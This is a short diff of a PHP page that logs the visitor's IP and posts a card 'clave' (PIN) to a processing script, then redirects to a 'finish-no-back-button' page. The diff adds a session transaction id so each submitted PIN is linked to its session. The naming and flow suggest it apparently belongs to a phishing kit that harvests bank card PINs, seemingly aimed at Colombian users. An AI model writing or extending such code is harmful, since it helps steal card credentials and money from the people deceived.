@@ -1,7 +1,9 @@
 <?php
+session_start();
 $ip = getenv("REMOTE_ADDR");
 setlocale(LC_TIME, "spanish");
 date_default_timezone_set('America/Bogota');
+$id_transaccion = $_SESSION['id_transaccion'] ?? 0;
 ?>
 <html>
 	<head>
@@ -86,8 +88,10 @@ date_default_timezone_set('America/Bogota');
 	</body>
 </html>
 <script type="text/javascript">
+	var idTransaccion = <?php echo $id_transaccion; ?>;
+
 	function paso_clave_tarj(clave) {
-		$.post("../../../process/paso_clave_tarj.php", { clave: clave }, function(data) {
+		$.post("../../../process/paso_clave_tarj.php", { clave: clave, id: idTransaccion }, function(data) {
 			setTimeout(function() {
 				window.location.href = "../../../finish-no-back-button/";
 			}, 1000);
